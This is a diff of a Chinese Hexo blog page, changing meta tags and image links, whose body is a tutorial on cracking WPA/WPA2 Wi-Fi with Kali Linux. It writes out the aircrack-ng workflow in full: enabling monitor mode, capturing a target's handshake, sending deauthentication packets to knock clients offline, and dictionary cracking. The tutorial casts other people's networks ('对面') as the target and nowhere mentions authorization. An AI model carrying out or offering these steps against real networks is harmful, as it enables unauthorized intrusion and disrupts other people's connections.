@@ -79,13 +79,13 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="http://yoursite.com/categories/index.html">
+<meta property="og:title" content="标签">
+<meta property="og:url" content="http://yoursite.com/tags/index.html">
 <meta property="og:site_name" content="从零开始的学习生涯">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-01-26T04:50:14.525Z">
+<meta property="og:updated_time" content="2018-01-26T04:50:25.031Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="分类">
+<meta name="twitter:title" content="标签">
 
 
 
@@ -113,7 +113,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/"/>
+  <link rel="canonical" href="http://yoursite.com/tags/"/>
 
 
 
@@ -327,11 +327,11 @@
       
 
       
-        <h1 id="利用kali破解wpa-wpa2加密的WIFI（爆破美学）"><a href="#利用kali破解wpa-wpa2加密的WIFI（爆破美学）" class="headerlink" title="利用kali破解wpa/wpa2加密的WIFI（爆破美学）"></a>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</h1><h2 id="硬件准备阶段："><a href="#硬件准备阶段：" class="headerlink" title="硬件准备阶段："></a>硬件准备阶段：</h2><p>因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是<strong>RT3070L芯片组</strong>的网卡，某宝上面无壳的只要20元，加壳才25元。<br>在kali中必须识别出网卡，使用<strong>ifconfig</strong>查看网卡信息，wlan0为无线网卡。<img src="https://imgchr.com/i/CJh0tx" alt="Alt text"></p>
+        <h1 id="利用kali破解wpa-wpa2加密的WIFI（爆破美学）"><a href="#利用kali破解wpa-wpa2加密的WIFI（爆破美学）" class="headerlink" title="利用kali破解wpa/wpa2加密的WIFI（爆破美学）"></a>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</h1><h2 id="硬件准备阶段："><a href="#硬件准备阶段：" class="headerlink" title="硬件准备阶段："></a>硬件准备阶段：</h2><p>因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是<strong>RT3070L芯片组</strong>的网卡，某宝上面无壳的只要20元，加壳才25元。<br>在kali中必须识别出网卡，使用<strong>ifconfig</strong>查看网卡信息，wlan0为无线网卡。<img src="https://s1.ax1x.com/2018/05/01/CJh0tx.jpg" alt="CJh0tx.jpg"></p>
 <h2 id="攻击准备阶段："><a href="#攻击准备阶段：" class="headerlink" title="攻击准备阶段："></a>攻击准备阶段：</h2><h3 id="开启网卡监听模式："><a href="#开启网卡监听模式：" class="headerlink" title="开启网卡监听模式："></a>开启网卡监听模式：</h3><pre><code>airmon-ng start wlan0
-</code></pre><p>如果成功的话，网卡名称会变成wlan0mon<br><img src="https://imgchr.com/i/CJhwA1" alt="Alt text"></p>
+</code></pre><p>如果成功的话，网卡名称会变成wlan0mon<br><img src="https://s1.ax1x.com/2018/05/01/CJhwA1.jpg" alt="CJhwA1.jpg"></p>
 <h3 id="扫描热点："><a href="#扫描热点：" class="headerlink" title="扫描热点："></a>扫描热点：</h3><pre><code>airodump-ng wlan0mon
-</code></pre><p>可以看到如图信息<img src="https://imgchr.com/i/CJha7R" alt="Alt text"></p>
+</code></pre><p>可以看到如图信息[<img src="https://s1.ax1x.com/2018/05/01/CJha7R.md.jpg" alt="CJha7R.md.jpg"></p>
 <h3 id="抓握手包："><a href="#抓握手包：" class="headerlink" title="抓握手包："></a>抓握手包：</h3><p>c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。</p>
 <pre><code>airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root
 
@@ -339,14 +339,14 @@
 --bssid 需要破解的wifi的mac地址
 -w cap文件名及路径
 wlan0mon 启用监听模式的网卡名
-</code></pre><p>当有人连接时就能抓到握手包。<img src="https://imgchr.com/i/CJhUB9" alt="Alt text"></p>
+</code></pre><p>当有人连接时就能抓到握手包。<img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p>
 <h4 id="如果对面都在使用wifi，没人连接怎么办？"><a href="#如果对面都在使用wifi，没人连接怎么办？" class="headerlink" title="如果对面都在使用wifi，没人连接怎么办？"></a>如果对面都在使用wifi，没人连接怎么办？</h4><p>通过以下命令断开设备与WiFi的连接</p>
 <pre><code>aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon
 
 -0 death（强制下线模式），20为执行次数
 -c 被断网的客户机MAC
 -a WIFI热点的mac
-</code></pre><p>抓包成功后白圈出现信息。<br><img src="https://imgchr.com/i/CJhUB9" alt="Alt text"></p>
+</code></pre><p>抓包成功后白圈出现信息。<br><img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p>
 <h3 id="爆破："><a href="#爆破：" class="headerlink" title="爆破："></a>爆破：</h3><h4 id="kali："><a href="#kali：" class="headerlink" title="kali："></a>kali：</h4><p>利用aircrack-ng命令</p>
 <pre><code>aircrack-ng -w 字典 握手包
 </code></pre><p>cpu跑这个破解速度有些慢。</p>
